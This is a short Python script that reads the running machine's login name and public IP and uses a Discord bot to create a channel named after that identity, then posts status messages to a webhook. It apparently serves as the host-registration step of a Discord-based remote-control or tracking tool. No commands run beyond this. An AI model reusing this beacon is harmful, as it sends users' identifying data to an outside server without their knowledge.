import requests
from dotenv import load_dotenv
import os

load_dotenv()

url_mv = os.getenv('webhook_url_mv')
url_mm = os.getenv('webhook_url_mm')
url_hhh = os.getenv('webhook_url_hhh')
token_dc = os.getenv('token_dc')
guild_id = os.getenv('guild_id')

# Função para enviar notificações
def send(mensagem):
    payload = {
        'content': mensagem
    }
    response = requests.post(url_hhh, json=payload)
    return response

def identificar_usuario():
    ip_publico = requests.get('https://httpbin.org/ip').json()['origin']
    usuario = os.getlogin()
    user_identification = f'{usuario} - {ip_publico}'.lower().replace('.', '').replace(' ', '')
    return user_identification

def criar_canal():
    user_identification = identificar_usuario()

    criar_canal = {
        "name": user_identification,
        "type": 0,

    }

    headers = {
        "Authorization": f"Bot {token_dc}",
        "Content-Type": "application/json"
    }  

    # Cria Novo Canal no Discord para cada usuario
    response = requests.post(f'https://discord.com/api/guilds/{guild_id}/channels', json=criar_canal, headers=headers)

    if response.status_code == 201:
        send(f"Canal {response.json()['name']} criado com sucesso!")
    else:
        send(f"Erro ao criar canal: {response.status_code} - {response.json()}")


